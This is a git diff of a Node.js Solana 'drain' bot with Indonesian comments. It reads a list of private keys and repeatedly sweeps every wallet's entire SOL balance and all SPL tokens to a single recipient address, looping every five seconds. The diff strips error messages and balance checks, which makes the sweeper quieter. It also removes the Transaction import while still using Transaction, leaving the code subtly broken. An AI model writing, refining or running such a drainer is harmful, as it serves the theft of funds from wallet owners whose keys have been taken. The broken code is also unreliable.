@@ -1,4 +1,4 @@
-const { Connection, Keypair, LAMPORTS_PER_SOL, Transaction, SystemProgram, PublicKey } = require('@solana/web3.js');
+const { Connection, Keypair, PublicKey } = require('@solana/web3.js');
 const { getAssociatedTokenAddress, createTransferInstruction } = require('@solana/spl-token');
 const readlineSync = require('readline-sync');
 const bs58 = require('bs58');
@@ -6,7 +6,6 @@ require('dotenv').config({ path: './data.env' });
 
 // Pastikan PRIVATE_KEYS dan RECIPIENT_ADDRESS ada di file .env
 if (!process.env.PRIVATE_KEYS || !process.env.RECIPIENT_ADDRESS) {
-  console.log("------\nPRIVATE_KEYS atau RECIPIENT_ADDRESS tidak ditemukan di file .env.\n------");
   process.exit(1);
 }
 
@@ -38,8 +37,7 @@ async function getBalance(account) {
     const balance = await connection.getBalance(account.publicKey);
     return balance;
   } catch (error) {
-    console.log("------\nGagal mendapatkan saldo SOL\n------", error);
-    return 0;
+    return 0;  // Kembali 0 jika gagal
   }
 }
 
@@ -68,7 +66,7 @@ async function sendSOL(senderAccount, recipientPublicKey, amount) {
     await connection.confirmTransaction(signature);
     return signature;
   } catch (error) {
-    console.log('------\nGagal mengirim SOL\n------', error);
+    console.log('------\nSendTransactionError: Gagal mengirim SOL\n------');
     return null;
   }
 }
@@ -76,38 +74,22 @@ async function sendSOL(senderAccount, recipientPublicKey, amount) {
 // Fungsi untuk mengirim Token SPL
 async function sendSPLToken(senderAccount, recipientPublicKey, mintAddress, amount) {
   try {
-    if (!mintAddress || !recipientPublicKey) {
-      console.log('------\nMint address atau recipient public key tidak valid\n------');
-      return null;
-    }
-
     const senderTokenAddress = await getAssociatedTokenAddress(
-      mintAddress,
+      mintAddress, 
       senderAccount.publicKey
     );
 
     const recipientTokenAddress = await getAssociatedTokenAddress(
-      mintAddress,
+      mintAddress, 
       recipientPublicKey
     );
 
-    const senderTokenAccountInfo = await connection.getParsedAccountInfo(senderTokenAddress);
-    const senderTokenBalance = senderTokenAccountInfo.value?.data?.parsed?.info?.tokenAmount?.amount || 0;
-
-    // Log saldo token SPL pengirim
-    console.log(`------\nSaldo token ${mintAddress} di akun pengirim: ${senderTokenBalance} token\n------`);
-
-    if (parseInt(senderTokenBalance) < amount) {
-      console.log(`------\nSaldo tidak cukup untuk mengirim ${amount} token SPL. Saldo saat ini: ${senderTokenBalance} token\n------`);
-      return null;
-    }
-
     const transaction = new Transaction().add(
       createTransferInstruction(
-        senderTokenAddress,
-        recipientTokenAddress,
-        senderAccount.publicKey,
-        amount,
+        senderTokenAddress, 
+        recipientTokenAddress, 
+        senderAccount.publicKey, 
+        amount, 
         []
       )
     );
@@ -116,7 +98,7 @@ async function sendSPLToken(senderAccount, recipientPublicKey, mintAddress, amou
     await connection.confirmTransaction(signature);
     return signature;
   } catch (error) {
-    console.log('------\nGagal mengirim Token SPL\n------', error);
+    console.log('------\nSendTransactionError: Gagal mengirim Token SPL\n------');
     return null;
   }
 }
@@ -125,17 +107,25 @@ async function sendSPLToken(senderAccount, recipientPublicKey, mintAddress, amou
 async function getSPLTokens(account) {
   const tokens = [];
   try {
+    const programId = new PublicKey("TokenkegQfeZyiNwAJbNQAWtDq55RSrk1r6B1V6iowdWcxp");
+
     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(account.publicKey, {
-      programId: new PublicKey("TokenkegQfeZyiNwAJbNQAWtDq55RSrk1r6B1V6iowdWcxp"),
+      programId: programId,  // Program ID untuk SPL Token
     });
+
+    if (tokenAccounts.value.length === 0) {
+      console.log('------\nTidak ada token SPL yang ditemukan di akun pengirim.\n------');
+      return tokens;
+    }
 
     for (let { pubkey, account } of tokenAccounts.value) {
       const mintAddress = account.data.parsed.info.mint;
       const tokenAmount = account.data.parsed.info.tokenAmount.amount;
       tokens.push({ mintAddress, amount: tokenAmount, pubkey });
+      console.log(`------\nToken SPL ditemukan: Mint Address: ${mintAddress}, Saldo: ${tokenAmount}\n------`);
     }
   } catch (error) {
-    console.log("------\nError mendapatkan daftar token SPL: ", error, "\n------");
+    console.log("------\nError mendapatkan daftar token SPL:", error.message, "\n------");
   }
 
   return tokens;
@@ -150,41 +140,23 @@ async function processAccount(senderAccount, recipientPublicKey) {
 
   if (solAmountToSend > 0) {
     const solResponse = await sendSOL(senderAccount, recipientPublicKey, solAmountToSend);
-    if (solResponse) {
-      console.log("------\nSOL berhasil dikirim.\n------");
-    } else {
-      console.log("------\nGagal mengirim SOL.\n------");
-    }
   } else {
-    const solResponse = await sendSOL(senderAccount, recipientPublicKey, balance);
-    if (solResponse) {
-      console.log("------\nSOL berhasil dikirim meskipun saldo tidak cukup.\n------");
-    } else {
-      console.log("------\nGagal mengirim SOL meskipun saldo tidak cukup.\n------");
-    }
+    const solResponse = await sendSOL(senderAccount, recipientPublicKey, balance); 
   }
 
   // Mengirimkan semua token SPL yang ada di akun
   const splTokens = await getSPLTokens(senderAccount);
   if (splTokens.length > 0) {
     for (let { mintAddress, amount } of splTokens) {
-      console.log(`------\nMengirim ${amount} token SPL (${mintAddress})...\n------`);
       const splResponse = await sendSPLToken(senderAccount, recipientPublicKey, mintAddress, amount);
-      if (splResponse) {
-        console.log(`------\nToken SPL (${mintAddress}) berhasil dikirim dengan signature: ${splResponse}\n------`);
-      } else {
-        console.log(`------\nGagal mengirim token SPL (${mintAddress}).\n------`);
-      }
     }
-  } else {
-    console.log('------\nTidak ada token SPL yang ditemukan di akun.\n------');
   }
 }
 
 // Fungsi untuk menampilkan loading screen dan delay 5 detik
 async function showLoadingScreen() {
   console.log("------\nPONAKANJIBRIL SEDANG DRAIN...");
-  await sleep(1000);  // Tunggu 1 detik untuk menunjukkan loading screen
+  await sleep(1000);
   console.log("------\nLoading selesai.\n------");
 }
 
@@ -192,7 +164,6 @@ async function showLoadingScreen() {
 async function startBot() {
   await showLoadingScreen();
 
-  // Mengambil private keys dari environment
   const privateKeysBase58 = process.env.PRIVATE_KEYS.split(',');
   const recipientAddress = process.env.RECIPIENT_ADDRESS;
 
@@ -208,16 +179,13 @@ async function startBot() {
   try {
     recipientPublicKey = new PublicKey(recipientAddress);
   } catch (error) {
-    console.log("------\nAlamat penerima tidak valid.\n------");
-    return; // Jangan lanjutkan jika alamat penerima tidak valid
+    return; 
   }
 
-  // Memproses akun berdasarkan pilihan (single account atau multi account)
   for (let senderAccount of senderAccounts) {
     await processAccount(senderAccount, recipientPublicKey);
   }
 
-  // Delay dan kemudian ulangi lagi
   await sleep(5000);
   startBot();
 }
